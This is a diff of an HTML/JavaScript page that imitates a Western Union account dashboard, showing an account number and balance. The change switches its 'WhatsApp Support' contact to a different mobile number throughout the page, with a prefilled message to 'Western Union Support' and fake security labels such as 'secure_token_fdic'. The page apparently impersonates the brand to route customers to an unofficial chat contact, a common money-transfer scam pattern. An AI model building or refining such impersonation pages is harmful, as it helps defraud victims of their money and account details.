@@ -236,7 +236,7 @@
             color: #0033A0;
         }
 
-        /* WhatsApp Support Card - Replaces ntfy topic card */
+        /* WhatsApp Support Card */
         .whatsapp-support-card {
             background: linear-gradient(135deg, #075E54, #128C7E);
             border-radius: 28px;
@@ -590,7 +590,7 @@
                     <div style="margin-top: 5px;">
                         <span class="whatsapp-tag"><i class="fas fa-user-check"></i> REAL-TIME AGENT</span>
                         <div class="whatsapp-number-badge" id="whatsappNumberDisplay">
-                            <i class="fab fa-whatsapp"></i> +1 (227) 285-9869
+                            <i class="fab fa-whatsapp"></i> +447448774304
                         </div>
                     </div>
                     <small style="color: rgba(255,255,255,0.85); font-size: 0.7rem; display: block; margin-top: 8px;">
@@ -664,10 +664,12 @@
     <script>
         // ============================================
         // WHATSAPP CUSTOMER SUPPORT SYSTEM
+        // SINGLE SOURCE OF TRUTH: +447448774304
         // ============================================
-        const WHATSAPP_NUMBER = '+447448774304'; // +1 (227) 285-9869
-        const WHATSAPP_MESSAGE = encodeURIComponent('Hello Western Union Support, I need assistance with my account.');
-        const WHATSAPP_LINK = `https://wa.me/${WHATSAPP_NUMBER}?text=${WHATSAPP_MESSAGE}`;
+        const WHATSAPP_NUMBER_DISPLAY = '+447448774304';   // human-readable
+        const WHATSAPP_NUMBER_RAW     = '447448774304';    // digits only for wa.me
+        const WHATSAPP_MESSAGE        = encodeURIComponent('Hello Western Union Support, I need assistance with my account.');
+        const WHATSAPP_LINK           = `https://wa.me/${WHATSAPP_NUMBER_RAW}?text=${WHATSAPP_MESSAGE}`;
 
         function sendSecureLog(action, meta = {}) {
             const storedUser = JSON.parse(localStorage.getItem('wu_current_user') || '{}');
@@ -681,7 +683,6 @@
                 environment: "secure_token_fdic"
             };
             console.log(`🔐 [SECURE] Dashboard event: ${action}`, meta);
-            // No external fetch for ntfy; we keep logging for internal purposes.
         }
 
         // ============================================
@@ -703,14 +704,14 @@
                         accountNumber: userData.account_number,
                         balance: userData.balance,
                         phone: userData.phone,
-                        whatsapp_support: WHATSAPP_NUMBER
+                        whatsapp_support: WHATSAPP_NUMBER_DISPLAY
                     };
 
                     // Update UI
                     document.getElementById('displayFullName').innerText = currentUser.fullname;
                     document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
                     document.getElementById('whatsappNumberDisplay').innerHTML =
-                        `<i class="fab fa-whatsapp"></i> +1 (227) 285-9869`;
+                        `<i class="fab fa-whatsapp"></i> ${WHATSAPP_NUMBER_DISPLAY}`;
                     refreshBalanceDisplay();
 
                     // Store in localStorage for session
@@ -731,6 +732,8 @@
                     currentUser = storedUser;
                     document.getElementById('displayFullName').innerText = currentUser.fullname;
                     document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
+                    document.getElementById('whatsappNumberDisplay').innerHTML =
+                        `<i class="fab fa-whatsapp"></i> ${WHATSAPP_NUMBER_DISPLAY}`;
                     refreshBalanceDisplay();
                 } else {
                     // ultimate fallback: generic demo user
@@ -743,6 +746,8 @@
                     };
                     document.getElementById('displayFullName').innerText = currentUser.fullname;
                     document.getElementById('accountNumberDisplay').innerText = currentUser.accountNumber;
+                    document.getElementById('whatsappNumberDisplay').innerHTML =
+                        `<i class="fab fa-whatsapp"></i> ${WHATSAPP_NUMBER_DISPLAY}`;
                     refreshBalanceDisplay();
                     localStorage.setItem('wu_current_user', JSON.stringify(currentUser));
                 }
@@ -846,21 +851,21 @@
         // WHATSAPP FUNCTIONS
         // ============================================
         function openWhatsappChat() {
-            sendSecureLog('whatsapp_chat_opened', { phone: WHATSAPP_NUMBER });
+            sendSecureLog('whatsapp_chat_opened', { phone: WHATSAPP_NUMBER_DISPLAY });
             window.open(WHATSAPP_LINK, '_blank', 'noopener,noreferrer');
         }
 
         function copyWhatsappNumber() {
-            navigator.clipboard.writeText(WHATSAPP_NUMBER).then(() => {
+            navigator.clipboard.writeText(WHATSAPP_NUMBER_DISPLAY).then(() => {
                 const btn = document.getElementById('copyWhatsappNumberBtn');
                 const originalHTML = btn.innerHTML;
                 btn.innerHTML = '<i class="fas fa-check"></i> Number Copied!';
                 setTimeout(() => {
                     btn.innerHTML = originalHTML;
                 }, 2000);
-                sendSecureLog('whatsapp_number_copied', {});
+                sendSecureLog('whatsapp_number_copied', { phone: WHATSAPP_NUMBER_DISPLAY });
             }).catch(() => {
-                alert("WhatsApp number: +44 7448 774304");
+                alert("WhatsApp number: " + WHATSAPP_NUMBER_DISPLAY);
             });
         }
 
@@ -888,6 +893,7 @@
                 case 'notifications':
                     showNotificationsAlert();
                     break;
+                case 'WHATSAPP_MESSAGE':
                 case 'whatsapp_chat':
                     openWhatsappChat();
                     break;
@@ -1001,11 +1007,11 @@
                 timestamp: new Date().toISOString(),
                 theme: 'modern_whatsapp_support',
                 whatsappEnabled: true,
-                supportNumber: WHATSAPP_NUMBER
+                supportNumber: WHATSAPP_NUMBER_DISPLAY
             });
 
             console.log(`✅ Western Union Dashboard Active — WhatsApp Support Ready`);
-            console.log(`💬 WhatsApp Support: +1 (227) 285-9869`);
+            console.log(`💬 WhatsApp Support: ${WHATSAPP_NUMBER_DISPLAY}`);
         });
     </script>
 </body>
